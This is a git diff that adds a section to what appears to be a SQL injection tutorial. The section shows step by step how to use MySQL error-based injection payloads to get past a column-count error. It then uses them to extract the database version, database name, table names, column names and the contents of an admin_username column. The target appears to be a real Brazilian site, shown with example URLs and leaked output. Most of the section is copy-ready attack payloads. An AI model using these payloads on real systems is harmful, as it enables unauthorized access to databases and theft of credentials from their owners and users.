@@ -197,6 +197,85 @@ Website must successfully load and we will see a number (in our case between 1-4
 
 We bypassed the WAF and found that the 1st column has the information (please refer to the photo).
 
+## Bypassing Error message: The used SELECT statements have a different number of columns
+Sometimes when you try to find which column is vulnerable via UNION based queries you will face this error:
+
+```The used SELECT statements have a different number of columns```
+
+Try the following payload to bypass the error message:  
+
+**Retrieve database version:**  
+```+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-```
+
+Example: ```http://domain.com.br/index.php?id=1'+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-```  
+Error Output includes the database version:  
+>Duplicate entry '**5.7.29**-log:1' for key ''  
+
+**Retrieve database name:**  
+```+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  
+
+Example: ```http://domain.com.br/index.php?id=1'+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  
+
+Error Output includes the database name:  
+>Duplicate entry '**litoflex**~1' for key ''
+
+**Retrieve tables:**  
+
+First we convert the database name to 0xHEX: **litoflex** -> **0x6c69746f666c6578**
+
+Given query will output the first table of the database:  
+```+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x6c69746f666c6578+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  
+
+Error output shows the first table name:  
+>Duplicate entry '**username**~1' for key ''  
+
+Given query will output the second table of the database:  
+```+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x6c69746f666c6578+LIMIT+1,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  
+
+Error output shows the first table name:  
+>Duplicate entry '**password**~1' for key ''  
+
+Given query will output the third table of the database:  
+```+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x6c69746f666c6578+LIMIT+2,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  
+
+Error output shows the first table name:  
+>Duplicate entry '**id**~1' for key ''  
+
+Do the same with but change the number in the payload to retrieve different tables: (+LIMIT+**0**,1)  
+Change it to: (+LIMIT+**1**,1) then (+LIMIT+**2**,1)... to retrieve different table columns.
+
+**Retrieve columns
+
+Before going further, convert the database name, table name(s) into 0xHEX. This case I will dump columns inside **username** table.
+
+Converting from string to 0xHEX:  
+```
+litoflex -> 0x6c69746f666c6578  
+username -> 0x757365726e616d65
+```
+The given query will dump the first column inside **username** table. *NOTE:* Please replace the following hex values with your hex values.
+
+```+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x757365726e616d65+AND+table_schema=0x6c69746f666c6578+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```  
+
+To dump the second column of **username** table, replace (+LIMIT+**0**,1) with (+LIMIT+**1**,1)  
+To dump the third column of **username** table, replace (+LIMIT+**1**,1) with (+LIMIT+**2**,1)  and so on...
+
+The first column is the one I am going to dump. Given query will output the data inside the first column: **admin_username**
+Before going further, convert the database name, table name and column(s) 0xHEX. This case I will dump data inside **admin_username** column.  
+
+
+Converting from string to 0xHEX:  
+```
+litoflex -> 0x6c69746f666c6578  
+username -> 0x757365726e616d65
+admin_username -> 0x61646d696e5f757365726e616d65
+```
+
+The final payload would be:  
+```+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(admin_username)+AS+CHAR),0x7e))+FROM+litoflex.username+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```
+
+The error will output the data that we aimed at.
+
 ## Retrieving the database  
 
 ### Dumping with DIOS  
